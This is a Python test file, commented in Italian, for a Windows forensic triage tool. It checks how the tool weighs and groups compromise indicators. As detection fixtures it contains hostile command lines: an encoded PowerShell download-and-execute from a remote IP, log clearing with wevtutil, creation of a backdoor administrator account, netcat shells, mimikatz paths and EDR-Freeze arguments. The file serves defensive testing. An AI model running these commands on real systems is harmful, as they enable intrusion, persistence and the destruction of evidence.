# -*- coding: utf-8 -*-
# SPDX-License-Identifier: Apache-2.0
# Prove del verdetto della versione 1.3 e delle correzioni della valutazione della 1.2:
#  - le quattro etichette e la regola: un fatto decisivo; due famiglie da fatti diversi = priorita' alta;
#  - i fatti (fenomeni): i segnali sullo stesso oggetto sono un fatto solo (casi cieco-025 e visto-070);
#  - discordanze, RAM con l'output anomalo, RAM contraddetta, controlli parziali e fonti fallite;
#  - l'installazione ricavata dai registri eventi (P1, P2, P3) e i nomi della macchina (B4);
#  - le regole sui processi padre (S1, S2, M5), gli strumenti trovati solo per nome (V4), Amcache.hve (V5).
import sys
import time
sys.dont_write_bytecode = True
import tc_controlli
import tc_c_eventi
import tc_c_registro
import tc_eventi
import tc_lingua
import tc_regole as R

esiti = {'ok': 0, 'ko': 0}


def u8(x):
    return x.encode('utf-8') if isinstance(x, unicode) else str(x)


def prova(nome, condizione, dettaglio=''):
    esiti['ok' if condizione else 'ko'] += 1
    if not condizione:
        print '  KO  %s%s' % (nome, (' -> ' + u8(dettaglio)) if dettaglio else '')
        sys.stdout.flush()


class RadiceFinta(object):
    piatta = False
    unica = True
    prefisso = u'/'
    volume = None

    def descrizione(self):
        return u'/'

    def file(self, *a, **k):
        return []

    def uno(self, *a, **k):
        return None


def nuovo():
    t = tc_controlli.Triage(RadiceFinta())
    t.riferimento = ORA
    return t


ORA = 1790000000.0
G = 86400.0
tc_lingua.imposta(tc_lingua.ITALIANO)
V = tc_controlli

# ---- 1. la regola del verdetto
t = nuovo()
t.decidi()
prova('nessun segnale, nessun avviso: nessun indicatore trovato', t.verdetto == V.V_NESSUN_INDICATORE, t.verdetto)
t = nuovo()
t.avviso(u'manca qualcosa')
t.decidi()
prova('solo un avviso: da verificare', t.verdetto == V.V_DA_VERIFICARE, t.verdetto)
t = nuovo()
t.segnala(9, R.DECISIVO, R.F_ANTIFORENSE, u'registro cancellato')
t.decidi()
prova('un fatto decisivo: indicatori di compromissione', t.verdetto == V.V_INDICATORI and u'1 fatto decisivo' in t.motivo_verdetto,
      t.motivo_verdetto)
prova('   e il motivo dice che non e\' una prova', u'Non \u00e8 una prova' in t.motivo_verdetto)
t = nuovo()
t.segnala(11, R.DA_CONFERMARE, R.F_ACCESSI, u'accesso da un indirizzo pubblico', oggetti=(R.chiave(u'ip', u'1.2.3.4'),))
t.segnala(35, R.DA_CONFERMARE, R.F_RMM, u'TeamViewer installato', oggetti=(R.chiave(u'rmm', u'TeamViewer'),))
t.decidi()
prova('due famiglie da fatti diversi: priorita\' alta, non indicatori (A1)', t.verdetto == V.V_PRIORITA, t.verdetto)
t = nuovo()
t.segnala(15, R.DA_CONFERMARE, R.F_PERSISTENZA, u'attivita', oggetti=(R.chiave(u'attivita', u'\\smbservice'),))
t.segnala(27, R.DA_CONFERMARE, R.F_LATERALE, u'creata e cancellata', oggetti=(R.chiave(u'attivita', u'smbservice'),))
t.decidi()
prova('due famiglie sullo stesso oggetto: un fatto solo, da verificare (D1)',
      t.verdetto == V.V_DA_VERIFICARE and u'stesso oggetto' in t.motivo_verdetto and len(t.fenomeni_elenco) == 1, t.motivo_verdetto)
t = nuovo()
t.segnala(25, R.DA_CONFERMARE, R.F_ESECUZIONE, u'a')
t.segnala(21, R.DA_CONFERMARE, R.F_ESECUZIONE, u'b')
t.decidi()
prova('una sola famiglia: da verificare', t.verdetto == V.V_DA_VERIFICARE and u'una sola famiglia' in t.motivo_verdetto)
prova('   due fatti senza oggetto in comune', t.conteggi['fatti_da_confermare'] == 2, repr(t.conteggi))
t = nuovo()
t.segnala(4, R.DECISIVO, R.F_STRUMENTI, u'discordanza', discordante=True)
t.decidi()
prova('un segnale discordante, anche decisivo, porta solo a da verificare', t.verdetto == V.V_DA_VERIFICARE, t.verdetto)
t = nuovo()
ram = {'immagine': u'x.raw', 'sha256': u'ab' * 32, 'conta': True, 'limitata': True}
t.ram_corrente = ram
t.segnala(4, R.DECISIVO, R.F_STRUMENTI, u'dalla RAM anomala')
t.ram_corrente = None
t.segnala(19, R.DA_CONFERMARE, R.F_PERSISTENZA, u'dal disco', oggetti=(u'avvio:x',))
t.decidi()
prova('RAM anomala: i suoi indizi non portano oltre da verificare (H2)', t.verdetto == V.V_DA_VERIFICARE, t.verdetto)
t = nuovo()
ram = {'immagine': u'y.raw', 'sha256': u'cd' * 32, 'conta': False, 'limitata': False}
t.ram_corrente = ram
t.segnala(4, R.DECISIVO, R.F_STRUMENTI, u'dalla RAM contraddetta')
t.ram_corrente = None
t.decidi()
prova('RAM contraddetta: il segnale resta ma non conta (B7)',
      t.verdetto == V.V_NESSUN_INDICATORE and len(t.segnali) == 1 and not t.segnali[0].conta
      and u'1 segnale viene da una RAM che il disco contraddice' in t.motivo_verdetto, (t.verdetto, t.motivo_verdetto))
prova('   conteggi per origine (B5)', [x[0] for x in t.conteggi['per_origine']] == [u'RAM y.raw'], repr(t.conteggi))
t = nuovo()
t.esito(5, 'non verificabile', u'netscan fallito', True)
t.decidi()
prova('fonte presente ma fallita senza avvisi: la rete di sicurezza ne mette uno (H1)',
      t.verdetto == V.V_DA_VERIFICARE and [a for a in t.avvisi if u'5' in a], t.avvisi)
t = nuovo()
t.fatto(17)
t.parziale(17, u'svcscan', u'non riuscito')
prova('controllo parziale nella tabella', t.stato_controllo(17)[0] == u'Parziale' and u'svcscan' in t.stato_controllo(17)[3],
      repr(t.stato_controllo(17)))
t.fatto(17)
prova('   e resta parziale anche se un altro passo lo segna fatto', t.stato_controllo(17)[0] == u'Parziale')

# ---- 2. le chiavi degli oggetti
f = R.chiave_file
prova('chiave_file: unita\', volume e maiuscole',
      f(u'C:\\Users\\X\\nc.exe') == f(u'\\VOLUME{01d2a1b2c3d4e5f6-12345678}\\USERS\\X\\NC.EXE')
      == f(u'\\Device\\HarddiskVolume3\\Users\\x\\nc.exe') == f(u'Users/x/nc.exe') == u'file:\\users\\x\\nc.exe',
      repr((f(u'C:\\Users\\X\\nc.exe'), f(u'\\VOLUME{01d2a1b2c3d4e5f6-12345678}\\USERS\\X\\NC.EXE'))))
prova('chiave_programma: i programmi di Windows non legano', R.chiave_programma(u'C:\\Windows\\System32\\cmd.exe') == u''
      and R.chiave_programma(u'"C:\\Tools\\nc.exe" -e cmd', True) == u'file:\\tools\\nc.exe')
prova('chiavi_tempo: due momenti a meno di 5 minuti hanno una chiave in comune',
      all([set(R.chiavi_tempo(u'p', x)) & set(R.chiavi_tempo(u'p', x + d)) for x in (599.0, 600.0, 899.0, 1234.5)
           for d in (1.0, 120.0, 299.0)]))

# ---- 3. i casi della valutazione: lo stesso oggetto visto da due regole
rac = tc_eventi.Raccolta()
rac._elemento = None
rac._processo(ORA - G, u'C:\\Users\\Public\\nc.exe', u'nc.exe 127.0.0.1 1337', u'C:\\Windows\\explorer.exe',
              u'mario', u'4688')
t = nuovo()
t.raccolta = rac
rac.processi_totali = 1
tc_c_eventi._processi(t, rac)
t.esecuzione(u'\\VOLUME{01d2}\\USERS\\PUBLIC\\NC.EXE', ORA - G, u'Prefetch', conteggio=1)
tc_c_registro.valuta_esecuzioni(t)
t.decidi()
famiglie = sorted(set([s.famiglia for s in t.segnali if s.peso >= R.DA_CONFERMARE]))
prova('visto-070: nc.exe a doppio uso e in una cartella insolita, un fatto solo',
      len(famiglie) >= 2 and len(set([s.fenomeno for s in t.segnali if s.peso >= R.DA_CONFERMARE])) == 1
      and t.verdetto == V.V_DA_VERIFICARE, repr([(s.famiglia, s.fenomeno, s.descrizione[:60]) for s in t.segnali]))

# il blocco 4104 e il comando codificato che l'ha lanciato
import base64
script = u'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")'
codificato = base64.b64encode(script.encode('utf-16-le'))
rac = tc_eventi.Raccolta()
rac._elemento = None
rac._processo(ORA - 100, u'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
              u'powershell -nop -w hidden -enc ' + codificato, u'C:\\Windows\\System32\\cmd.exe', u'mario', u'4688')
rac._4104({'Dati': {u'ScriptBlockText': script, u'ScriptBlockId': u'{1234}', u'MessageTotal': u'1', u'Path': u''},
           'Livello': 5, 'Ora': ORA - 99, 'SidUtente': u'S-1-5-21-1-2-3-1001'})
t = nuovo()
t.raccolta = rac
rac.processi_totali = 1
tc_c_eventi._processi(t, rac)
t.decidi()
pesanti = [s for s in t.segnali if s.peso >= R.DA_CONFERMARE]
prova('blocco 4104 e comando codificato: lo stesso fatto (Silence of the RAM)',
      len(pesanti) >= 2 and len(set([s.fenomeno for s in pesanti])) == 1,
      repr([(s.peso, s.fenomeno, s.descrizione[:70]) for s in t.segnali]))
prova('   conteggi: 1 fatto decisivo, piu\' segnali', t.conteggi['fatti_decisivi'] == 1 and t.conteggi['segnali_decisivi'] >= 1,
      repr(t.conteggi))

# la cancellazione dei registri e il comando che l'ha fatta
rac = tc_eventi.Raccolta()
rac._elemento = None
rac._processo(ORA - 60, u'C:\\Windows\\System32\\wevtutil.exe', u'wevtutil cl Security', u'C:\\Windows\\System32\\cmd.exe',
              u'admin', u'4688')
rac.cancellazioni.append({'ora': ORA - 58, 'id': 1102, 'registro': u'Security', 'utente': u'PC\\admin', 'elemento': None})
t = nuovo()
t.raccolta = rac
rac.processi_totali = 1
tc_c_eventi._processi(t, rac)
tc_c_eventi._cancellati(t, rac)
t.decidi()
pesanti = [s for s in t.segnali if s.peso >= R.DA_CONFERMARE]
prova('registro cancellato e wevtutil cl: lo stesso fatto', len(pesanti) == 2 and len(set([s.fenomeno for s in pesanti])) == 1,
      repr([(s.peso, s.fenomeno, s.descrizione[:60]) for s in t.segnali]))

# ---- 4. l'installazione ricavata dai registri eventi (P1, P2, P3) e i nomi della macchina (B4)
def con_preparazione(nomi):
    t = nuovo()
    rac = tc_eventi.Raccolta()
    rac._elemento = None
    rac.nomi = nomi
    t.raccolta = rac
    tc_c_eventi._fase_installazione(t, rac)
    return t, rac


INIZIO = ORA - 30 * G
t, rac = con_preparazione({u'win-vr474tj38h3': [INIZIO, INIZIO + 120, 40, u'WIN-VR474TJ38H3'],
                           u'desktop-a8calr3': [INIZIO + 130, ORA, 9000, u'DESKTOP-A8CALR3']})
prova('preparazione dal cambio di nome', t.contesto.get('preparazione') == (INIZIO, INIZIO + 130), repr(t.contesto.get('preparazione')))
t.riferimento = INIZIO + 2 * 3600
t.contesto['computer'] = u'DESKTOP-A8CALR3'
for ora in (INIZIO + 3900,):
    rac.account = [{'ora': ora, 'id': 4720, 'soggetto': u'WORKGROUP\\DESKTOP-A8CALR3$', 'bersaglio': u'DESKTOP-A8CALR3\\user',
                    'sid_bersaglio': u'S-1-5-21-1-2-3-1001', 'membro': u'', 'nome_membro': u'', 'computer': u'desktop-a8calr3',
                    'elemento': None},
                   {'ora': ora + 2, 'id': 4732, 'soggetto': u'WORKGROUP\\DESKTOP-A8CALR3$', 'bersaglio': u'Builtin\\Administrators',
                    'sid_bersaglio': u'S-1-5-32-544', 'membro': u'S-1-5-21-1-2-3-1001', 'nome_membro': u'-',
                    'computer': u'desktop-a8calr3', 'elemento': None}]
tc_c_eventi._account(t, rac)
prova('P1: account creato e aggiunto agli amministratori dall\'account del computer durante il setup: non segnalato',
      not [s for s in t.segnali if s.peso >= R.DA_CONFERMARE], repr([(s.peso, s.descrizione) for s in t.segnali]))
t2, rac2 = con_preparazione({u'desktop-a8calr3': [INIZIO, ORA, 9000, u'DESKTOP-A8CALR3']})
t2.riferimento = ORA
t2.contesto['computer'] = u'DESKTOP-A8CALR3'
rac2.account = [dict(rac.account[0], ora=ORA - G), dict(rac.account[1], ora=ORA - G + 2)]
tc_c_eventi._account(t2, rac2)
prova('senza preparazione nei registri lo stesso account creato dal computer resta da confermare',
      len([s for s in t2.segnali if s.peso == R.DA_CONFERMARE]) == 2, repr([(s.peso, s.descrizione) for s in t2.segnali]))
t3, rac3 = con_preparazione({u'desktop-vecchio': [INIZIO - 200 * G, INIZIO, 50000, u'DESKTOP-VECCHIO'],
                             u'desktop-nuovo': [INIZIO + 10, ORA, 9000, u'DESKTOP-NUOVO']})
prova('un computer rinominato dopo mesi d\'uso non e\' un\'installazione', not t3.contesto.get('preparazione'))
t3.contesto['computer'] = u'DESKTOP-NUOVO'
t3.riferimento = ORA
rac3.account = [{'ora': ORA - G, 'id': 4720, 'soggetto': u'WORKGROUP\\DESKTOP-VECCHIO$', 'bersaglio': u'DESKTOP-VECCHIO\\svcmgmt',
                 'sid_bersaglio': u'S-1-5-21-1-2-3-1002', 'membro': u'', 'nome_membro': u'', 'computer': u'desktop-vecchio',
                 'elemento': None}]
tc_c_eventi._account(t3, rac3)
prova('B4: un account creato con il nome vecchio del computer resta segnalato (caso F4)',
      [s for s in t3.segnali if s.peso == R.DA_CONFERMARE and u'svcmgmt' in s.descrizione],
      repr([(s.peso, s.descrizione) for s in t3.segnali]))
# P2: il servizio temporaneo di un programma di installazione
t, rac = con_preparazione({u'windeveval': [INIZIO - 11 * G, INIZIO - 11 * G + 5000, 900, u'WinDevEval'],
                           u'windev2310eval': [INIZIO, ORA, 9000, u'WinDev2310Eval']})
rac.copertura[u'system.evtx'] = [INIZIO, ORA, 100, None, 0, ORA, 0, 0, 0, 100]
for ora, nome in ((INIZIO + 9000, u'Malwarebytes Installer Service'), (ORA - G, u'Altro Installer Service')):
    rac.servizi.append({'ora': ora, 'nome': nome, 'percorso': u'"C:\\Users\\User\\AppData\\Local\\Temp\\MBAMInstallerService.exe"',
                        'tipo': u'user mode service', 'avvio': u'auto start', 'account': u'LocalSystem', 'utente': u'',
                        'fonte': u'7045', 'elemento': None})
tc_c_eventi._servizi(t, rac)
pesi = dict([(s.descrizione.split(u'\u00bb')[0], s.peso) for s in t.segnali])
prova('P2: servizio in una cartella temporanea durante l\'installazione: informativo; dopo: da confermare',
      pesi.get(u'Servizio installato \u00abMalwarebytes Installer Service') == R.INFORMATIVO and
      pesi.get(u'Servizio installato \u00abAltro Installer Service') == R.DA_CONFERMARE, repr(pesi))
# P3: PowerShell codificato degli script di preparazione
packer = u'PowerShell -ExecutionPolicy Bypass -OutputFormat Text -EncodedCommand ' + \
    base64.b64encode(u'C:/Windows/Temp/packer-windows-update.ps1'.encode('utf-16-le'))
for ora, nome in ((INIZIO - 11 * G + 100, u'WinDevEval'), (INIZIO - 11 * G - 7200, u'WinDevEval'),
                  (ORA - G, u'WinDev2310Eval')):
    # il secondo e' prima dell'inizio della preparazione nei registri svuotati (Security, System), ma porta
    # il nome della preparazione: anche questo e' della preparazione
    rac._400({'Lista': [u'Available', u'None', u'\tHostApplication=%s %s\r\n' % (packer, int(ora))], 'Ora': ora,
              'Computer': nome})
rac.processi_totali = 0
t.raccolta = rac
tc_c_eventi._processi(t, rac)
ps = [s for s in t.segnali if s.controllo == 25]
prova('P3: comando codificato durante la preparazione o con il suo nome: informativo; dopo: da confermare',
      sorted([s.peso for s in ps]) == [R.INFORMATIVO, R.INFORMATIVO, R.DA_CONFERMARE],
      repr([(s.peso, s.descrizione, s.ora) for s in ps]))

# ---- 5. processi padre (S1, S2, M5) negli eventi 4688
def processo(immagine, riga, padre):
    rac = tc_eventi.Raccolta()
    rac._elemento = None
    rac._processo(ORA - 10, immagine, riga, padre, u'SYSTEM', u'4688')
    t = nuovo()
    t.raccolta = rac
    rac.processi_totali = 1
    tc_c_eventi._processi(t, rac)
    return [(s.peso, s.famiglia, s.descrizione) for s in t.segnali]


W = u'C:\\Windows\\System32\\'
r = processo(W + u'cmd.exe', u'cmd.exe /c "echo. | powershell get-host"', W + u'lsass.exe')
prova('S1: lsass.exe che avvia cmd.exe: decisivo', [x for x in r if x[0] == R.DECISIVO and u'lsass.exe' in x[2]], repr(r))
r = processo(W + u'net.exe', u'net user servicemgmt x /add', W + u'wininit.exe')
prova('S1: wininit.exe che avvia net.exe: decisivo', [x for x in r if x[0] == R.DECISIVO and u'wininit.exe' in x[2]], repr(r))
r = processo(W + u'cmd.exe', u'cmd.exe /c echo x', W + u'services.exe')
prova('S1: services.exe che avvia cmd.exe: da confermare, esecuzione remota',
      [x for x in r if x[0] == R.DA_CONFERMARE and x[1] == R.F_LATERALE and u'services.exe' in x[2]], repr(r))
r = processo(W + u'svchost.exe', W + u'svchost.exe -k netsvcs', W + u'services.exe')
prova('services.exe che avvia svchost.exe: niente', not r, repr(r))
r = processo(W + u'WerFaultSecure.exe', W + u'WerFaultSecure.exe /h /pid 3280 /tid 3284 /encfile 196 /cancel 264 /type 268310',
             W + u'AdobeUdpate.exe')
prova('S2: WerFaultSecure /pid lanciato da un programma qualunque: decisivo (EDR-Freeze)',
      [x for x in r if x[0] == R.DECISIVO and u'EDR-Freeze' in x[2]], repr(r))
r = processo(W + u'WerFaultSecure.exe', W + u'WerFaultSecure.exe /h /pid 3280 /tid 3284 /encfile 196 /cancel 264 /type 268310',
             W + u'WerFault.exe')
prova('S2: WerFaultSecure lanciato da WerFault: niente', not r, repr(r))
r = processo(W + u'WerFaultSecure.exe', W + u'WerFaultSecure.exe /h /pid 3280 /tid 3284 /encfile 196 /cancel 264 /type 268310', u'')
prova('S2: WerFaultSecure con il padre sconosciuto: da confermare', [x for x in r if x[0] == R.DA_CONFERMARE], repr(r))
r = processo(W + u'cmd.exe', u'cmd.exe', u'C:\\Tools\\ncat.exe')
prova('M5: shell figlia di ncat: decisivo', [x for x in r if x[0] == R.DECISIVO and u'ncat.exe' in x[2]], repr(r))

# ---- 6. strumenti trovati solo per nome (V4)
def esecuzioni(*voci):
    t = nuovo()
    for percorso, fonte, eseguito, versione in voci:
        t.esecuzione(percorso, ORA - G, fonte, eseguito=eseguito, versione=versione)
    tc_c_registro.valuta_esecuzioni(t)
    return [(s.peso, s.descrizione) for s in t.segnali if u'mimikatz' in s.descrizione.lower()]


r = esecuzioni((u'C:\\Users\\Public\\mimikatz.exe', u'AmCache', False, []))
prova('V4: strumento d\'attacco solo per nome (AmCache): da confermare', r and r[0][0] == R.DA_CONFERMARE, repr(r))
r = esecuzioni((u'C:\\Users\\Public\\mimikatz.exe', u'AmCache', False, [u'mimikatz.exe', u'mimikatz']))
prova('V4: con le informazioni di versione che lo confermano: decisivo', r and r[0][0] == R.DECISIVO, repr(r))
r = esecuzioni((u'C:\\Users\\Public\\mimikatz.exe', u'Prefetch', True, []))
prova('V4: eseguito (Prefetch): decisivo', r and r[0][0] == R.DECISIVO, repr(r))

# ---- 7. Amcache.hve mancante su Windows 8 e successivi (V5)
t = nuovo()
t.contesto['build'] = 19045
t.contesto['prodotto'] = u'Windows 10 Pro'
tc_c_registro.amcache(t)
prova('V5: Amcache.hve mancante su Windows 10: avviso e controllo 26 parziale',
      [a for a in t.avvisi if u'Amcache.hve' in a] and 26 in t.parziali, repr(t.avvisi))
t = nuovo()
t.contesto['build'] = 7601
tc_c_registro.amcache(t)
prova('V5: su Windows 7 nessun avviso', not t.avvisi, repr(t.avvisi))

# ---- 8. credenziali esplicite verso un nome che la macchina ha avuto (B4)
rac = tc_eventi.Raccolta()
rac.nomi = {u'pc-vecchio': [1, 2, 3, u'PC-VECCHIO'], u'pc-nuovo': [3, 4, 5, u'PC-NUOVO']}
rac.espliciti[(u'PC\\admin', u'PC\\altro', u'PC-VECCHIO', u'powershell.exe', u'-')] = [1, ORA, ORA]
rac.copertura[u'security.evtx'] = [ORA - G, ORA, 10, None, 0, ORA, 0, 0, 0, 10]
t = nuovo()
t.contesto['computer'] = u'PC-NUOVO'
tc_c_eventi._espliciti(t, rac)
prova('B4: credenziali esplicite verso il nome vecchio della macchina non sono movimento laterale', not t.segnali,
      repr([s.descrizione for s in t.segnali]))

# ---- 9. l'account creato da riga di comando e l'evento 4720 di quell'account sono un fatto solo (D1)
for riga, atteso in ((u'net user /add servicemgmt MyP@ssw0rd', u'servicemgmt'),
                     (u'C:\\Windows\\system32\\net1 user servicemgmt P /add', u'servicemgmt'),
                     (u'net localgroup "Remote Desktop Users" DOM\\mario /add', u'mario'),
                     (u'cmd /c net user h P /add & net localgroup administrators h /add', u'h'),
                     (u"New-LocalUser -Password $p -Description 'x y' -Name svc3", u'svc3'),
                     (u'Add-LocalGroupMember -Group Administrators -Member svc5', u'svc5'),
                     (u'net user administrator /active:yes', u''), (u'net localgroup administrators', u'')):
    prova('D1: account dal comando %s' % riga, R.account_del_comando(riga).lower() == atteso,
          R.account_del_comando(riga))
t = nuovo()
t.segnala(25, R.DECISIVO, R.F_ESECUZIONE, u'avviato da lsass.exe: net user /add servicemgmt P', u'', ORA,
          oggetti=R.oggetti_comando(u'net user /add servicemgmt P', u'C:\\Windows\\System32\\net.exe'))
t.segnala(10, R.DA_CONFERMARE, R.F_ACCOUNT, u'Account servicemgmt creato', u'', ORA + 60,
          oggetti=(R.chiave(u'account', u'servicemgmt'),))
t.segnala(10, R.DA_CONFERMARE, R.F_ACCOUNT, u'Account altro creato', u'', ORA + 90, oggetti=(R.chiave(u'account', u'altro'),))
t.decidi()
fatti = [s.fenomeno for s in t.segnali]
prova('D1: il comando che crea servicemgmt e il suo 4720 sono un fatto, l\'altro account un altro',
      fatti[0] == fatti[1] and fatti[2] != fatti[0], repr(fatti))
prova('D1: un fatto decisivo e uno da confermare', (t.conteggi['fatti_decisivi'], t.conteggi['fatti_da_confermare']) == (1, 1),
      repr(t.conteggi))

print 'verdetto: prove riuscite %d, prove fallite %d' % (esiti['ok'], esiti['ko'])
